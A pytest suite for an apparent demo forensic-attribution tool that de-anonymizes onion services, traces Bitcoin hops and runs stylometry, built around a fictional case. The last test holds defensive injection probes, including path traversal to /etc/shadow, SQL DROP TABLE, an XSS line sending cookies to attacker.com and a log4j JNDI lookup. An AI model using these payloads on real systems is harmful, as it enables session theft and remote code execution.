"""
Project BHEDAK - Phase 1 Verification Test Suite
Verifies all 4 engines, core models, security invariants, statutory exporters,
and FastAPI REST endpoints for the Operation MAYAJAAL MVP.
"""

import pytest
from fastapi.testclient import TestClient

from demo.bhedak_mvp.backend.core.models import (
    FullCaseDossier,
    AttributionSignal
)
from demo.bhedak_mvp.backend.core.security import ForensicSecurityCore
from demo.bhedak_mvp.backend.engines.engine1_infra import (
    PureMurmurHash3,
    InfrastructureDeAnonymizer
)
from demo.bhedak_mvp.backend.engines.engine2_graph import KnowledgeGraphEngine
from demo.bhedak_mvp.backend.engines.engine3_stylometry import StylometricEngine
from demo.bhedak_mvp.backend.engines.engine4_scorer import AsymmetricAttributionScorer
from demo.bhedak_mvp.backend.exporters.bsa63_certificate import BSA63CertificateCompiler
from demo.bhedak_mvp.backend.exporters.stix_exporter import STIX21Exporter
from demo.bhedak_mvp.backend.main import app, MASTER_CASE


client = TestClient(app)


# ==============================================================================
# 1. Forensic Security & Cryptographic Invariants Tests
# ==============================================================================

def test_constant_time_compare():
    token1 = "9A4F3B218C7E45D012FA6789B0C12345D6789ABC"
    token2 = "9a4f3b218c7e45d012fa6789b0c12345d6789abc "
    token3 = "9A4F3B218C7E45D012FA6789B0C12345D6789ABD"  # 1 bit difference

    assert ForensicSecurityCore.constant_time_compare(token1, token2) is True
    assert ForensicSecurityCore.constant_time_compare(token1, token3) is False


def test_merkle_tree_integrity_and_tamper_detection():
    leaves = [
        "leaf_evidence_tor_frame_01",
        "leaf_evidence_mod_status_ip",
        "leaf_evidence_btc_tx_hex",
        "leaf_evidence_pgp_key_asc"
    ]
    root1, audit1 = ForensicSecurityCore.compute_merkle_root(leaves)
    assert len(root1) == 64
    assert len(audit1) == 4

    # Identical input produces deterministic root
    root2, _ = ForensicSecurityCore.compute_merkle_root(leaves)
    assert root1 == root2

    # Single-character tampering in one leaf completely alters the Merkle root
    tampered_leaves = leaves.copy()
    tampered_leaves[1] = "leaf_evidence_mod_status_ip_TAMPERED"
    tampered_root, _ = ForensicSecurityCore.compute_merkle_root(tampered_leaves)
    assert root1 != tampered_root


def test_evidence_signing():
    payload = {"case_id": "NTRO-TEST-001", "root": "abc123"}
    sig_block = ForensicSecurityCore.sign_evidence_package(payload)
    assert sig_block["signature_algorithm"] == "Ed25519 (RFC 8032)"
    assert "NTRO" in sig_block["key_identifier"]
    assert "FIPS 140-3" in sig_block["fips_level"]


# ==============================================================================
# 2. Master Case Dossier & Schema Validation Tests
# ==============================================================================

def test_master_case_dossier_loads_cleanly():
    assert MASTER_CASE.case_metadata.operation_codename == "MAYAJAAL (ऑपरेशन मायाजाल)"
    assert MASTER_CASE.attributed_subject.legal_name == "Rohan Sharma"
    assert MASTER_CASE.attributed_subject.citizenship == "Indian"
    assert MASTER_CASE.attributed_subject.confidence_tier == "DETERMINISTIC_PROOF"
    assert MASTER_CASE.infrastructure.resolved_origin.ip == "103.152.18.42"
    assert "Navi Mumbai" in MASTER_CASE.infrastructure.resolved_origin.datacenter_location


# ==============================================================================
# 3. Engine 1: Infrastructure De-Anonymization Tests
# ==============================================================================

def test_pure_murmurhash3():
    # Test vector against standard MurmurHash3
    test_bytes = b"test_favicon_content_123"
    h = PureMurmurHash3.hash32(test_bytes, seed=0)
    assert isinstance(h, int)
    assert -0x80000000 <= h <= 0x7FFFFFFF


def test_mod_status_parser():
    sample_apache_out = """
    Apache Server Status for 103.152.18.42
    Server Version: Apache/2.4.52 (Ubuntu)
    127.0.0.1 - - [18/Sep/2026] "GET / HTTP/1.1" 200
    192.168.1.50 - - [18/Sep/2026] "GET /internal HTTP/1.1" 200
    """
    extracted_ip = InfrastructureDeAnonymizer.parse_mod_status_leak(sample_apache_out)
    assert extracted_ip == "103.152.18.42"


def test_scan_known_onion():
    domain = "bharatleaks742wqpovbnm34xzvkw90a1bcdefghijk.onion"
    res = InfrastructureDeAnonymizer.scan_hidden_service(domain)
    assert res["status"] == "DE_ANONYMIZED_SUCCESS"
    assert res["mod_status_ip_leak"] == "103.152.18.42"
    assert res["resolved_origin"].flag == "PHYSICAL_ORIGIN_CONFIRMED"
    assert "Navi Mumbai" in res["resolved_origin"].datacenter_location


# ==============================================================================
# 4. Engine 2: Knowledge Graph & Attribution Pathfinding Tests
# ==============================================================================

def test_knowledge_graph_pathfinding():
    nodes = [n.model_dump() for n in MASTER_CASE.graph_nodes]
    edges = [e.model_dump() for e in MASTER_CASE.graph_edges]
    engine = KnowledgeGraphEngine(nodes, edges)

    # Shortest path from bitcoin intake wallet to primary suspect Rohan Sharma
    path = engine.find_shortest_attribution_path("wallet-btc-intake", target_category="primary")
    assert path is not None
    assert len(path) > 0
    # Final destination node must be actor-rohan
    assert path[-1]["node"]["id"] == "actor-rohan"


def test_trace_blockchain_hops():
    nodes = [n.model_dump() for n in MASTER_CASE.graph_nodes]
    edges = [e.model_dump() for e in MASTER_CASE.graph_edges]
    engine = KnowledgeGraphEngine(nodes, edges)

    hops = engine.trace_blockchain_fund_hops("wallet-btc-intake")
    assert len(hops) >= 2
    # Check that CoinDCX VASP deposit is reached
    targets = [h["to_entity"] for h in hops]
    assert "wallet-btc-unhosted" in targets
    assert "vasp-coindcx-btc" in targets


# ==============================================================================
# 5. Engine 3: Stylometry & Diurnal Engine Tests
# ==============================================================================

def test_stylometry_cosine_and_markers():
    sample_text = "Bhai payment verify kar do jaldi, revert back on session id for proof ... aur fir we finalize."
    res = StylometricEngine.analyze_sample(sample_text)
    
    assert res["indicbert_cosine_similarity"] > 0.40
    assert len(res["linguistic_markers"]) >= 2
    assert "Hinglish" in res["inferred_dialect"]
    assert res["is_adversarially_sanitized"] is False


def test_adversarial_ai_detection():
    # Formal, flat LLM sanitized prompt
    ai_sample = (
        "Furthermore, it is important to note that all operational activities adhere to standard guidelines. "
        "Moreover, in conclusion, all documentation has been thoroughly processed and vetted. "
        "Additionally, the necessary parameters have been reviewed and approved accordingly."
    )
    res = StylometricEngine.analyze_sample(ai_sample)
    assert res["is_adversarially_sanitized"] is True


def test_diurnal_sleep_window():
    timestamps = [
        "2026-09-15T08:00:00Z", "2026-09-15T12:00:00Z", "2026-09-15T16:00:00Z",
        "2026-09-16T09:00:00Z", "2026-09-16T14:00:00Z", "2026-09-17T11:00:00Z"
    ]
    diurnal = StylometricEngine.analyze_diurnal_timestamps(timestamps)
    assert diurnal["timezone_offset_hours"] == 5.5
    assert "IST" in diurnal["projected_sleep_trough_ist"]


# ==============================================================================
# 6. Engine 4: Asymmetric Confidence Scorer Tests
# ==============================================================================

def test_scorer_enforces_probabilistic_ceiling():
    # Purely probabilistic signals without deterministic proof
    probabilistic_signals = [
        AttributionSignal(
            signal_name="IndicBERT Multilingual Stylometry",
            tier="Probabilistic",
            weight=0.50,
            score=0.98,  # High raw score
            rationale="High stylistic match"
        ),
        AttributionSignal(
            signal_name="Diurnal Activity Pattern",
            tier="Probabilistic",
            weight=0.50,
            score=0.95,
            rationale="IST sleep window match"
        )
    ]
    result = AsymmetricAttributionScorer.evaluate_signals(probabilistic_signals)
    
    # Must be hard-capped at 0.65!
    assert result["has_deterministic_proof"] is False
    assert result["composite_score"] <= 0.65
    assert result["confidence_tier"] == "PROBABILISTIC_LEAD"


def test_scorer_with_deterministic_proof():
    # Evaluate master case signals
    result = AsymmetricAttributionScorer.evaluate_signals(MASTER_CASE.attribution_signals)
    assert result["has_deterministic_proof"] is True
    assert result["composite_score"] >= 0.85
    assert result["confidence_tier"] == "DETERMINISTIC_PROOF"
    assert "HIGH CONFIDENCE" in result["confidence_rating"]


# ==============================================================================
# 7. Statutory Exporters Tests (BSA Section 63 & STIX 2.1)
# ==============================================================================

def test_bsa63_certificate_generation():
    cert = BSA63CertificateCompiler.compile_certificate(MASTER_CASE)
    assert cert["statutory_framework"] == "Bharatiya Sakshya Adhiniyam, 2023 (Section 63)"
    assert "Section 63(4)(a)" in cert["part_a_custodian"]["statutory_clause"]
    assert "Section 63(4)(b) & (c)" in cert["part_b_examiner"]["statutory_clause"]
    assert "National Physical Laboratory" in cert["part_b_examiner"]["time_source_synchronization"]
    assert len(cert["merkle_root_sha256"]) == 64
    assert "Rohan Sharma" in cert["certificate_plaintext"]


def test_stix21_exporter_bundle():
    bundle = STIX21Exporter.export_bundle(MASTER_CASE)
    assert bundle["type"] == "bundle"
    assert bundle["spec_version"] == "2.1"
    
    types = [obj["type"] for obj in bundle["objects"]]
    assert "identity" in types
    assert "threat-actor" in types
    assert "infrastructure" in types
    assert "indicator" in types
    assert "relationship" in types


# ==============================================================================
# 8. FastAPI Gateway REST Integration Tests
# ==============================================================================

def test_api_health():
    res = client.get("/api/health")
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "OPERATIONAL"
    assert data["security_standard"] == "Millee 20-Point Hardening & Section 63 BSA 2023"


def test_api_case():
    res = client.get("/api/case")
    assert res.status_code == 200
    data = res.json()
    assert data["attributed_subject"]["legal_name"] == "Rohan Sharma"
    assert data["attributed_subject"]["confidence_tier"] == "DETERMINISTIC_PROOF"
    assert "₹3,82,80,000" in data["case_metadata"]["financial_impact_inr"]


def test_api_scan_onion():
    payload = {"onion_address": "bharatleaks742wqpovbnm34xzvkw90a1bcdefghijk.onion"}
    res = client.post("/api/scan-onion", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "DE_ANONYMIZED_SUCCESS"
    assert data["mod_status_ip_leak"] == "103.152.18.42"
    assert data["resolved_origin"]["isp"] == "NetWeb Technologies India Ltd"


def test_api_graph_and_path():
    res = client.get("/api/graph?start_node=wallet-btc-intake")
    assert res.status_code == 200
    data = res.json()
    assert data["nodes_count"] > 0
    assert "attribution_path" in data
    assert len(data["attribution_path"]) > 0


def test_api_blockchain_hops():
    res = client.get("/api/graph/blockchain-hops?wallet_id=wallet-btc-intake")
    assert res.status_code == 200
    data = res.json()
    assert data["total_hops"] >= 2


def test_api_stylometry():
    payload = {
        "sample_text": "Bhai jaldi verify karo payment, otherwise data broker will sell directly ... confirm on session wire."
    }
    res = client.post("/api/stylometry", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert data["indicbert_cosine_similarity"] > 0.0
    assert data["attribution_tier"] == "PROBABILISTIC_LEAD (Capped at 0.65)"
    assert "linguistic_markers" in data
    assert isinstance(data["linguistic_markers"], list)
    assert len(data["linguistic_markers"]) > 0


def test_api_score_evaluate():
    res = client.get("/api/score/evaluate")
    assert res.status_code == 200
    data = res.json()
    assert data["has_deterministic_proof"] is True
    assert data["confidence_tier"] == "DETERMINISTIC_PROOF"


def test_api_score_evaluate_post():
    payload = {
        "signals": [
            {
                "signal_name": "AI Stylometric Marker",
                "tier": "Probabilistic",
                "weight": 0.30,
                "score": 0.864,
                "rationale": "Stylistic match"
            }
        ]
    }
    res = client.post("/api/score/evaluate", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert data["has_deterministic_proof"] is False
    assert data["composite_score"] <= 0.65
    assert data["confidence_tier"] == "PROBABILISTIC_LEAD"



def test_api_export_bsa63():
    res = client.get("/api/export/bsa63")
    assert res.status_code == 200
    data = res.json()
    assert "Bharatiya Sakshya Adhiniyam" in data["statutory_framework"]
    assert "merkle_root_sha256" in data


def test_api_export_stix():
    res = client.get("/api/export/stix")
    assert res.status_code == 200
    data = res.json()
    assert data["type"] == "bundle"
    assert data["spec_version"] == "2.1"


# ==============================================================================
# 8. Pillar 2 Edge-Case, Boundary & Malformed Injection Probes
# ==============================================================================

def test_edge_case_null_and_none_probes():
    """Verify fail-closed handling for None/null parameters and empty signal structures."""
    # 1. Scorer with empty or None-like signal evaluation
    eval_result = AsymmetricAttributionScorer.evaluate_signals([])
    assert eval_result["composite_score"] == 0.0
    assert eval_result["confidence_tier"] == "UNRELIABLE"
    assert eval_result["has_deterministic_proof"] is False

    # 2. API endpoint rejecting None / invalid body (HTTP 422 Unprocessable Entity)
    res = client.post("/api/stylometry", json={"sample_text": None})
    assert res.status_code in (400, 422)

    # 3. Security core handles None / empty token comparison safely
    assert ForensicSecurityCore.constant_time_compare("", "") is True
    assert ForensicSecurityCore.constant_time_compare("abc", "") is False


def test_edge_case_boundary_empty_and_zero_limits():
    """Verify boundary conditions with 0 values, empty string limits, and zero-length inputs."""
    # 1. Zero weight signal evaluation
    zero_signal = AttributionSignal(
        signal_name="Zero Weight Test Signal",
        tier="Probabilistic",
        weight=0.0,
        score=0.95,
        rationale="Testing zero boundary condition"
    )
    res = AsymmetricAttributionScorer.evaluate_signals([zero_signal])
    assert res["composite_score"] == 0.0
    assert res["confidence_tier"] == "UNRELIABLE"

    # 2. Empty string text input to stylometry engine
    empty_res = StylometricEngine.analyze_sample("")
    assert empty_res["sample_length_chars"] == 0
    assert empty_res["indicbert_cosine_similarity"] == 0.0

    # 3. Buffer overflow limit probe on PureMurmurHash3 with 64KB repetitive pattern
    overflow_buffer = b"A" * 65536
    h = PureMurmurHash3.hash32(overflow_buffer, seed=0)
    assert isinstance(h, int)


def test_edge_case_malformed_inputs_and_injection_probes():
    """Verify system security invariants against malformed onion domains, SQL injection and XSS payloads."""
    # 1. Malformed onion address formats
    malformed_onions = [
        "not-an-onion.com",
        "../../etc/shadow",
        "; DROP TABLE forensic_logs; --",
        "<script>alert(1)</script>.onion",
        "short.onion"
    ]
    engine1 = InfrastructureDeAnonymizer()
    for bad_onion in malformed_onions:
        result = engine1.scan_hidden_service(bad_onion)
        # Must fail-closed without server crashes or unhandled exceptions
        assert result["status"] in ("FAILED_SCAN", "TARGET_UNREACHABLE", "SIMULATED_PROBE") or result.get("mod_status_ip_leak") is None

    # 2. SQL injection and XSS payload strings in stylometry input
    injection_payloads = [
        "' OR '1'='1' -- SQL injection forensic test string",
        "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
        "{{7*7}} template injection forensic test sample",
        "${jndi:ldap://attacker.com/a} log4j injection payload test"
    ]
    for injection in injection_payloads:
        res = client.post("/api/stylometry", json={"sample_text": injection})
        assert res.status_code == 200
        # Check payload was processed safely as plain forensic text without code execution
        data = res.json()
        assert "indicbert_cosine_similarity" in data

